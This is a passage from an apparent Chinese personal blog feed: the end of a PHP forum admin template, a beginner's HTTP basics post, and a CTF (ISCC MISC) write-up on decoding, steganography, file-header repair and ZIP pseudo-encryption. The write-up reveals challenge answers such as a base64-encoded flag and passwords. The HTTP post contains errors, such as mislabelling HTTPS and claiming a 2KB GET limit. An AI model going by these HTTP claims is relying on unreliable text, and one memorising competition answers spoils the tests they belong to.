class=&quot;crumb-step&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crumb-name&quot;&gt;站点设置&lt;/span&gt;&lt;/div&gt;        &lt;/div&gt;        &lt;div class=&quot;result-wrap&quot;&gt;            &lt;form method=&quot;post&quot;&gt;                &lt;div class=&quot;config-items&quot;&gt;                    &lt;div class=&quot;config-title&quot;&gt;                        &lt;h1&gt;&lt;i class=&quot;icon-font&quot;&gt;&amp;#xe00a;&lt;/i&gt;网站信息设置&lt;/h1&gt;                    &lt;/div&gt;                    &lt;div class=&quot;result-content&quot;&gt;                        &lt;table width=&quot;100%&quot; class=&quot;insert-tab&quot;&gt;                                &lt;tr&gt;                                    &lt;th&gt;&lt;i class=&quot;require-red&quot;&gt;*&lt;/i&gt;网站标题：&lt;/th&gt;                                    &lt;td&gt;&lt;input type=&quot;text&quot; id=&quot;&quot; value=&quot;&lt;?php echo $data_info[&#39;title&#39;]?&gt;&quot; size=&quot;85&quot; name=&quot;title&quot; class=&quot;common-text&quot;&gt;&lt;/td&gt;                                &lt;/tr&gt;                                &lt;tr&gt;                                    &lt;th&gt;&lt;i class=&quot;require-red&quot;&gt;*&lt;/i&gt;关键字：&lt;/th&gt;                                    &lt;td&gt;&lt;input type=&quot;text&quot; id=&quot;&quot; value=&quot;&lt;?php echo $data_info[&#39;keywords&#39;]?&gt;&quot; size=&quot;85&quot; name=&quot;keywords&quot; class=&quot;common-text&quot;&gt;&lt;/td&gt;                                &lt;/tr&gt;                                &lt;tr&gt;                                    &lt;th&gt;&lt;i class=&quot;require-red&quot;&gt;*&lt;/i&gt;描述：&lt;/th&gt;                                    &lt;td&gt;&lt;input type=&quot;text&quot; id=&quot;&quot; value=&quot;&lt;?php echo $data_info[&#39;description&#39;]?&gt;&quot; size=&quot;85&quot; name=&quot;description&quot; class=&quot;common-text&quot;&gt;&lt;/td&gt;                                &lt;/tr&gt;                                &lt;tr&gt;                                    &lt;th&gt;&lt;/th&gt;                                    &lt;td&gt;                                        &lt;input type=&quot;submit&quot; value=&quot;提交&quot; name=&quot;submit&quot; class=&quot;btn btn-primary btn6 mr10&quot;&gt;                                        &lt;input type=&quot;button&quot; value=&quot;返回&quot; onclick=&quot;history.go(-1)&quot; class=&quot;btn btn6&quot;&gt;                                    &lt;/td&gt;                                &lt;/tr&gt;                    &lt;/div&gt;                &lt;/div&gt;            &lt;/form&gt;        &lt;/div&gt;    &lt;/div&gt;    &lt;!--/main--&gt;&lt;/div&gt;&lt;?phpinclude_once &#39;inc/footer.inc.php&#39;;//footer?&gt;</code></pre><p>后台的基本功能已经实现了大部分，剩余的与前台有点关联，暂且先不做总结。。</p><p><strong>感悟：</strong></p><p>总结之后，对论坛后台开发，又有了新的认识。且熟悉了基本开发思路和流程。。后续我将会把论坛前台开发再总结一下。希望再次有所收获。。。小白进阶ing。。。。</p>]]></content>
      
      
      <categories>
          
          <category> 编程开发 </category>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web开发 </tag>
            
            <tag> bbs论坛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP协议基础</title>
      <link href="/2019/05/29/HTTP%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/"/>
      <url>/2019/05/29/HTTP%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<p>因为想要学习抓包工具的使用，而抓包抓到是HTTP头流量包(有点看不太懂)，所以学习了一点HTTP协议的相关基础知识。。。。</p><h3 id="一、初识HTTP协议"><a href="#一、初识HTTP协议" class="headerlink" title="一、初识HTTP协议"></a>一、初识HTTP协议</h3><h4 id="1、HTTP协议是什么"><a href="#1、HTTP协议是什么" class="headerlink" title="1、HTTP协议是什么"></a>1、HTTP协议是什么</h4><p>HTTP（Hypertext Transfer Protocol）中文“超文本传输协议”，是一种为分布式，合作式，多媒体信息系统服务，面向应用层的协议，是Internet上目前使用最广泛的应用层协议，它基于传输层的TCP协议进行通信，HTTP协议是通用的、无状态的协议。</p><p><strong>作用：</strong>用于在服务器和客户机之间传输超文本文件。</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvYzU3OWZlMzhiNzhkZTgyZS5qcGc" alt></p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvYjk1ZTI5ODFhY2FhODE1Mi5qcGc" alt></p><h3 id="二、HTTP协议在网络中的应用"><a href="#二、HTTP协议在网络中的应用" class="headerlink" title="二、HTTP协议在网络中的应用"></a>二、HTTP协议在网络中的应用</h3><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvNzMwNjIwNjcxNzVhYjhlYy5qcGc" alt></p><h3 id="三、HTTP协议基础知识"><a href="#三、HTTP协议基础知识" class="headerlink" title="三、HTTP协议基础知识"></a>三、HTTP协议基础知识</h3><h4 id="1、HTTP的特点"><a href="#1、HTTP的特点" class="headerlink" title="1、HTTP的特点"></a>1、HTTP的特点</h4><p>客户/服务器模式：一个服务器可以为分布在世界的许多客户服务。</p><p>简单：HTTP本身处理简单,有效地处理大量请求，HTTP服务器程序规模小，所以经由HTTP的通信速度快,与其它协议相比,时间开销小得多。</p><p>灵活: HTTP允许传输任意类型的数据对象，可以通过Content-type来指定数据类型。</p><p>无状态：HTTP是无状态的协议，缺少状态记忆,运行速度高,服务器应答速度较快。</p><h4 id="2、HTTP的事务处理"><a href="#2、HTTP的事务处理" class="headerlink" title="2、HTTP的事务处理"></a>2、HTTP的事务处理</h4><ol><li>客户端与服务器端建立连接</li><li>客户端向服务器端发送请求</li><li>服务器端向客户端回复响应</li><li>断开连接</li></ol><h4 id="3、消息链"><a href="#3、消息链" class="headerlink" title="3、消息链"></a>3、消息链</h4><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvOTgxM2I2YTYyZGM2OWYzZC5qcGc" alt></p><h4 id="4、HTTP的消息类型"><a href="#4、HTTP的消息类型" class="headerlink" title="4、HTTP的消息类型"></a>4、HTTP的消息类型</h4><h5 id="1-请求-Request-消息"><a href="#1-请求-Request-消息" class="headerlink" title="1.请求(Request)消息"></a>1.请求(Request)消息</h5><p><strong>概念：</strong>由客户端发给服务器的消息。其组成包括:请求行(Request-Line)，可选的头域(Header Field )，及实体(Entity-Body)。</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvODU1ZTQwYjBiNTAwZTVlNC5qcGc" alt></p><h6 id="请求行"><a href="#请求行" class="headerlink" title="请求行"></a>请求行</h6><p>请求行有3个元素:请求方法、URI、HTTP版本，最后以CRLF结尾，各个元素之间用SP字符隔开。</p><ol><li>请求方法：指出客户请求服务器执行的一般操作。HTTP/1.1中定义了八种请求方法，其中GET、POST、HEAD、是常用请求方法。</li><li>URI:统一资源标识，简单地讲被请求资源所处的地址，如：<a href="http://www.taobao.com/pub/WWW/page.html，" target="_blank" rel="noopener">http://www.taobao.com/pub/WWW/page.html，</a></li><li>HTTP版本：HTTP/1.1，高版本的服务器接受低版本客户的请求，并向客户发送同样版本的应答；高版本的客户接受低版本服务器的应答。</li></ol><p><em>方法：</em></p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvNGQ5NzkzZmM1ZjhhM2ZkOS5qcGc" alt></p><h6 id="GET-POST-的区别"><a href="#GET-POST-的区别" class="headerlink" title="GET/POST 的区别"></a>GET/POST 的区别</h6><ol><li><p>get是从服务器上获取数据，post是向服务器传送数据。</p></li><li><p>get是把参数数据队列加到提交表单的ACTION属性所指的URL中，值和表单内各个字段一一对应，在URL中可以看到。post是通过HTTP post机制，将表单内各个字段与其内容放置在HTML HEADER内一起传送到ACTION属性所指的URL地址。用户看不到这个过程。</p></li><li><p>对于get方式，<a href="https://www.baidu.com/s?wd=%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF&tn=44039180_cpr&fenlei=mv6quAkxTZn0IZRqIHckPjm4nH00T1d9PjN-PHD4rHbLmHnznjm10AP8IA3qPjfsn1bkrjKxmLKz0ZNzUjdCIZwsrBtEXh9GuA7EQhF9pywdQhPEUiqkIyN1IA-EUBt3P1R1PHT4r0" target="_blank" rel="noopener">服务器端</a>用Request.QueryString获取变量的值，对于post方式，<a href="http://www.baidu.com/s?wd=%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF&tn=44039180_cpr&fenlei=mv6quAkxTZn0IZRqIHckPjm4nH00T1d9PjN-PHD4rHbLmHnznjm10AP8IA3qPjfsn1bkrjKxmLKz0ZNzUjdCIZwsrBtEXh9GuA7EQhF9pywdQhPEUiqkIyN1IA-EUBt3P1R1PHT4r0" target="_blank" rel="noopener">服务器端</a>用Request.Form获取提交的数据。</p></li><li><p>get传送的数据量较小，不能大于2KB。post传送的数据量较大</p></li><li><p>get安全性非常低，post安全性较高。但是执行效率却比Post方法好。</p></li></ol><h6 id="报头行-报文头"><a href="#报头行-报文头" class="headerlink" title="报头行(报文头)"></a>报头行(报文头)</h6><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvMTQ5ZjEyZTRhOTQwMTU5NS5qcGc" alt></p><p>1、Connection：close</p><p>是在告知服务器本浏览器不想使用永久连接方式（HTTP/1.0使用非永久连接，HTTP/1.1默认使用永久连接）。</p><p>2、User-agent：Mozilla/4.0</p><p>指定用户代理服务器的类型。</p><p>3、Accept-Encoding：gzip,compress</p><p>指出发送此请求的浏览器支持哪些压缩编码方式。</p><p>4、Accept-languag：en</p><p>指出客户浏览器支持的语言是英语（english）</p><p><strong>报文体(请求数据)</strong></p><h5 id="2-响应-Response-消息"><a href="#2-响应-Response-消息" class="headerlink" title="2.响应(Response)消息"></a>2.响应(Response)消息</h5><p><strong>概念：</strong>服务器接收并处理客户端发过来的请求后会返回一个HTTP的响应消息；HTTP响应也由四个部分组成，分别是：状态行、消息报头、空行和响应正文。</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvNGQzZDliMjg0Nzg3ZTk5MC5qcGc" alt></p><h6 id="状态行"><a href="#状态行" class="headerlink" title="状态行"></a>状态行</h6><p>HTTP/1.1 200 OK </p><p>状态行由协议版本、状态码、原因短语</p><p>3个元素组成，各个元素之间用SP分隔。状态码字段由三个数字组成，标识客户请求方法的结果。</p><p><em>状态码5种可能的值：</em></p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvZDU3NzU2MTI5YmZlNGIyYy5qcGc" alt></p><h6 id="报头行-报文头-1"><a href="#报头行-报文头-1" class="headerlink" title="报头行(报文头)"></a>报头行(报文头)</h6><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvNTA2ZjRkNWZjNDNkMTNiMC5qcGc" alt></p><p>1、Date：Thu,13Oct200503:17:33GMT</p><p>指出服务器创建并发送本响应消息的日期和时间。HTTP允许下面三种不同格式的日期/时间，但必须是格林尼治标准时间：HTTP-date=rfc1123-date|rfc-850-date| asctime-date</p><p>2、Server：Apache/2.0.54(Unix)</p><p>指出本消息是由Apache服务器产生的，服务器版本为2.0.54</p><p>3、Last—Nodified：Mon,22Jun199809;23;24GMT</p><p>指出对象本身的创建或最后修改日期或时间。</p><p>4、Last—Nodified:</p><p>报头项对于对象的高速缓存至关重要，且不论这种高速缓存是发生在本地客户主机上还是发生在网络高速缓存服务器主机(也就是代理服务器主机)上。</p><p>5、Content—Length：682l</p><p>指出所发送对象的字节数。</p><p>6、Content—Type：text/html</p><p>指出包含在实体中的对象是HTML文本。</p><h4 id="5、HTTP和http区别"><a href="#5、HTTP和http区别" class="headerlink" title="5、HTTP和http区别"></a>5、HTTP和http区别</h4><p>HTTP通常承载在TCP协议之上,有时会承载在TLS、SSL之上，就是http  </p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvMDVkMmM4MjgxYWZkZDU4NC5qcGc" alt></p><p><strong>http加解密过程</strong></p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvYmRhZTdhODJmYjFlM2U5NC5wbmc" alt></p><p>HTTP基础知识总算有点了解了。可以愉快的抓包分析修改了耶。。。小白进阶ing</p>]]></content>
      
      
      <categories>
          
          <category> 协议分析 </category>
          
          <category> HTTP协议 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTTP协议 </tag>
            
            <tag> HTTP头流量包 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ISCC-MISC做题总结</title>
      <link href="/2019/05/27/ISCC-MISC%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/"/>
      <url>/2019/05/27/ISCC-MISC%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>本小白又来总结了。。虽然做题做的非常菜，但还是总结一下吧。总结一下做题思想，让自己能够不断提高。。。。</p><h3 id="MISC1-1"><a href="#MISC1-1" class="headerlink" title="MISC1- (1)"></a>MISC1- (1)</h3><p><strong>这道题主要是八进制转ascll码，然后base解码</strong></p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvNzhhNGJlNzk4NWY0MzRhNi5qcGc" alt></p><p>下载附件，并解压，得到一个message.txt文件，打开</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvNjQ1ZjIyMjEyNzIxM2E4MC5qcGc" alt></p><p>发现每个数字的每一位最高是7，考虑一下是不是8进制转换10(或16)进制，然后转ascll码。然后为了方便，我写了个代码转换(此时，再次想要抽时间学习python)</p><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){    char arr[10000];    int i,j,k,res1=0;    for(k=0;;k++)    {        char res=0;        scanf(&quot;%s&quot;,arr);        for(i=0;i&lt;strlen(arr);i++)        {            res1+=(arr[i]-&#39;0&#39;)*1;            for(j=0;j&lt;strlen(arr)-i-1;j++)            {                res1*=8;            }            res+=res1;            res1=0;        }        printf(&quot;%c&quot;,res);    }    return 0;}</code></pre><p>运行，并把所有数字直接复制粘贴，然后执行，得<code>V2VsbCBkb25lIQoKIEZsYWc6IElTQ0N7TjBfMG5lX2Nhbl9zdDBwX3kwdX0K</code></p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvNzBlODVkODExYjljZTQ3ZC5qcGc" alt></p><p>看着，应该是base解码，所以在线解码得</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvOTU0ZWU3MWViYWNmODRjMi5qcGc" alt></p><p>果然想的不错。。。。。。。。。</p><h3 id="MISC1-2"><a href="#MISC1-2" class="headerlink" title="MISC1- (2)"></a>MISC1- (2)</h3><p><strong>这道题主要是LSB隐写</strong></p><p>LSB(英文 least significant bit)即最低有效位。LSB加密是信息隐藏中最基本的方法。由于人们识别声音或图片的能力有限，因此我们稍微改动信息的某一位是不会影响我们识别声音或图片的。</p><p>LSB隐写通过修改RGB颜色分量的最低位二进制（LSB），来进行信息的储存，人类的眼睛并不能感知到前后的变化。每个像数可以携带3bit的信息。</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvMDY4ZDhiMWFhM2UwNGE3My5qcGc" alt></p><p>下载附件，并解压，得到一个文件，打开发现只有一张图片(倒立屋.png)，这时可以考虑一下是不是LSB隐写。用stegsolve打开图片</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvYTA4N2IzM2E2NGExZjI1OS5qcGc" alt></p><p>Red、Green、Blue的最低有效位0那一列打对勾（<a href="http://www.cnblogs.com/nul1/p/9594387.html" target="_blank" rel="noopener">原因</a>），并点击Preview，在最上面会发现flag了！！</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvNjg0MmFkODk5NmExZjQ1My5qcGc" alt></p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvZDhlZGFhZmEyYzU1MjYzMC5qcGc" alt></p><p>然而提交，发现不对。想到题目是倒立屋，所以试了下反着写。但又不对，然后尝试各种提交格式，结果没有任何格式的对了，即<code>9102_cCsI</code></p><h3 id="MISC1-3"><a href="#MISC1-3" class="headerlink" title="MISC1- (3)"></a>MISC1- (3)</h3><p><strong>这道题主要是键盘有关的密码(键盘手势)</strong></p><p>首先，我先了解一下<strong>键盘密码</strong>，毕竟不能单纯只为了做题而做题</p><p><strong>密码背景：</strong>凡是利用键盘的特性而制作的密码，都可以称之为键盘密码。</p><p><strong>常见的分类：</strong>有计算机的键盘和手机的键盘两种，而这两种又根据具体的方法可以衍生出层出不穷的加密方法。</p><p><strong>弱点：</strong>不安全，隐蔽性不强。</p><p><a href="https://wenku.baidu.com/view/9a96c09db8f3f90f76c66137ee06eff9aef8498f.html" target="_blank" rel="noopener">详细介绍</a></p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvNjNhNzhkNThkYjExZWQ3Zi5qcGc" alt></p><p>下载附件，并解压，得到一个文件，文件内容如下</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvNzg0YTQ4ODlmMDI1YjE1Yy5qcGc" alt></p><p>于是把可能是flag的标记了一下。发现字母都是大写字母，看着在键盘上有点规律，仔细操作演示后发现，应该是对应键盘手势。所以把这行字母，运用键盘手势最终得到</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvNmRlNzMwYmU4MmQ5NmE0OS5qcGc" alt></p><h3 id="MISC1-4"><a href="#MISC1-4" class="headerlink" title="MISC1- (4)"></a>MISC1- (4)</h3><p><strong>这道题主要是常见的对称非、对称加密，这个题是AES加密</strong></p><p>首先，需要了解知道<a href="http://blog.csdn.net/shenggaofei/article/details/52333687" target="_blank" rel="noopener">常见的对称非、对称加密原理</a></p><p>下载文件，解压，发现里边是一个Aesop.gif图片。用winhex打开，在最下面发现一组可疑字符</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvNmM5N2Y0ZjA1ODQyYTU1ZS5qcGc" alt></p><p>比较像Base64编码，所以使用Base64在线解码</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvODJiYWVmYmFlYmUwOTEwNC5qcGc" alt></p><p>发现字符串Salted，应该是所谓“加盐”。就是对密码进行一些混淆增加破解的难度。</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvZjhmMmJiYjQ1YjBiZTFmMC5qcGc" alt></p><p>发现需要密码才能解密，于是再考虑一下题目文件图片，发现图片在变换很快，于是我使用PS把动态图还原，发现</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvMTU2MjNjNzhkMzNlZWEzZi5qcGc" alt></p><p>这应该就是所需密码了，而密文应该就是之前winhex里的可疑字符串，然后开始解密，发现只有使用AES才能够解密</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvMDhmNmUzNTQzODRkMmI4OC5wbmc" alt></p><p>然而并没有出现有效结果，于是尝试再解密一次，发现了最终flag了！！！！</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvZGY5YjI5OWQ2YWQ1NjMwNC5wbmc" alt></p><h3 id="MISC2-1"><a href="#MISC2-1" class="headerlink" title="MISC2- (1)"></a>MISC2- (1)</h3><p><strong>这道题主要是空格转二进制转16进制再转ascll码</strong></p><p>下载文件并解压，得到txt文件</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvOGI3YzNiODc2NTBkZGJlNy5qcGc" alt></p><p>发现都是繁体字，想到繁体转简体，然而并没有什么用。。。然后分析之后发现有好多空格。每句话后都有空格，有的是一个，有的是两个。尝试一个空格转换成0，两个空格转换成1</p><p>我用的是notepad++的替换功能进行替换，替换完后，把所有繁体字删除得到</p><p><img src="http://img-blog.csdnimg.cn/20190801003338714.jpg" alt></p><p>然后考虑，把二进制转换成16进制，再转ascii码</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvOThkODE3MjYwNGNlZmMwNy5qcGc" alt></p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvZWVjMDhkODBjNGZjZTc0Ny5qcGc" alt></p><p>得到最终flag了！！！！</p><h3 id="MISC2-2"><a href="#MISC2-2" class="headerlink" title="MISC2- (2)"></a>MISC2- (2)</h3><p><strong>这道题主要是文件头部格式修复</strong></p><p>下载文件并解压，得到exe文件。然而并不能运行。于是考虑用winhex打开，也可以用sublime打开，发现</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvNzg3NWM4MGQ5NzVhYWM4NS5qcGc" alt></p><p>应该和Base64有关，尝试Base64解码</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvOWUyNDk3ZDk5YzEyNDQ5Yy5qcGc" alt></p><p>发现这些字符应该能重新编码png图片。然而使用在线Base64转图片，结果失败了。应该是png某些格式有问题，于是考虑能不能用脚本转换。查询脚本并下载修改</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvYTY5Yjk5M2E3ZTljYjE5Zi5wbmc" alt></p><p>运行得到</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvZGE4NTc1MWFjMGE5M2Q0OC5wbmc" alt></p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvZThiZTU2ZmFlMzhmZjRjMi5qcGc" alt></p><p>于是考虑001.png文件头格式是不是有问题，用winhex打开。比对png文件头格式，发现果然有问题</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvMjU1ZjE1OTYzOWY4YjgyOC5qcGc" alt></p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvMDgzYzM4MjlhNzEzYjUwMS5qcGc" alt></p><p>果然格式有问题，把00改成0A后，得到一张二维码</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvYTUzMDRhMGFlNDQyOWRlZS5wbmc" alt></p><p>扫描后，进行得到</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvODQ2NmU4YjBhMzE3NTI4Yi5qcGc" alt></p><h3 id="MISC2-3"><a href="#MISC2-3" class="headerlink" title="MISC2- (3)"></a>MISC2- (3)</h3><p><strong>这道题主要是数据隐藏</strong></p><p>下载文件并解压，得到png文件，png图像是个二维码。扫描二维码得</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvNDI0MWUwOTg2YWM4NTU0MS5wbmc" alt></p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvZmM1MTVkMzZlMzM3MmMxOC5qcGc" alt></p><p>应该是base64加密，解密得</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvNzBiMzMyYzkxOWM1ODBiZS5qcGc" alt></p><p>然后url解码得</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvNjRlZWNjZTZiOTZjMWQyMy5qcGc" alt></p><p>然而并不是答案。。。。。</p><p>经过其他尝试，最终把二维码图片用winrar打开，发现</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvY2YwOTY2NmMzOGY1MjNkYy5qcGc" alt></p><p>需要密码，于是想到之前解到的<code>PASS{0K_I_L0V3_Y0u!}</code>输入密码框，结果不对。所以密码应该是花括号里的内容。输入密码，解压txt文件并打开得到</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvNTBkZmZiZTIyNDBiOWUwYy5qcGc" alt></p><p>得到最终结果啦！！！</p><h3 id="MISC3-1"><a href="#MISC3-1" class="headerlink" title="MISC3- (1)"></a>MISC3- (1)</h3><p><strong>这道题主要是数据隐藏</strong></p><p>下载文件并解压，得到jpg文件，然而并不能打开</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvMDRhOGFhNzA1Y2Q2NDhlNy5qcGc" alt></p><p>于是用winhex打开考虑修复文件头、文件尾。</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvMGNmMWI4NmM0YjBmZTVlYS5qcGc" alt></p><p>发现文件尾没有问题。文件头有问题</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvOTllZTQ2ZDkzNDNiMDc5MC5qcGc" alt></p><p>修复文件头，图片果然显示出来了。然而并没有什么用。。。。。。。。。</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvZjg0ZDIyYjVmNWY3OTRjNy5qcGc" alt></p><p>于是，想着把修复后的图片用winrar打开试试。发现了一个文件夹，有点开心，难到答案要出来了。然而，是我想多了。。。。。</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvNGE5MTM2OTM0MTljMWEyMy5qcGc" alt></p><p>发现了50张二维码图片。。。。。一个一个的扫描感觉不太现实！于是我扫描了第1张和第50张</p><p>第1张</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvM2JlMzRjYzhmOTc1MTc3Zi5qcGc" alt></p><p>第50张</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvNjAyZDQ2YTViZjhlNWZjNy5qcGc" alt></p><p>发现第50张比较可疑，把第50张二维码用winhex打开，发现flag了！！！</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvOTMzM2FkY2JlOWM5NDE0OC5qcGc" alt></p><h3 id="MISC3-2"><a href="#MISC3-2" class="headerlink" title="MISC3- (2)"></a>MISC3- (2)</h3><p><strong>这道题主要是伪加密和数据隐藏</strong></p><p>下载文件，解压发现</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvZDg2NTgwOTY4NDUzMjQ4MS5qcGc" alt></p><p>此时考虑压缩包加密文件是否是伪加密，所以用winhex打开，发现果然是伪加密</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvNzVlZGQ0YTNhMWVkY2RiOC5qcGc" alt></p><p>把文件头504B0304后的3、4位改为0000，以及把504B0102后的5、6位的0908改为0000，即可破解伪加密。然后解压，运行，发现</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvZjc5Y2VhODZiMTdhMDEwMC5qcGc" alt></p><p>发现需要用户名和密码。于是把得到的exe文件用winhex打开，发现了用户名和密码。虽说winhex打开能找到用户名和密码，不过太乱不太好找。于是用了下逆向常用工具，发现用户名和密码了。。。</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvMmFkZmY2MzY3YzQ1NGNjZS5qcGc" alt></p><p>运行程序，输入用户名和密码，得到最终flag！！！！</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvNGRlN2QxNjFjMTEzMDkxYi5qcGc" alt></p><h3 id="MISC3-3"><a href="#MISC3-3" class="headerlink" title="MISC3- (3)"></a>MISC3- (3)</h3><p><strong>这道题主要是音频隐写</strong></p><p>下载文件并解压，得到png文件，然而并不能打开</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvOTk2OTlmOTUxMDVhNGRmMS5qcGc" alt></p><p>于是用winhex打开考虑修复文件头、文件尾。发现文件头有问题，果断修复(把12改为89)</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvYThjZjdlNjNlOTYxYWZlNS5qcGc" alt></p><p>修复完后，得到一张二维码</p><p><img 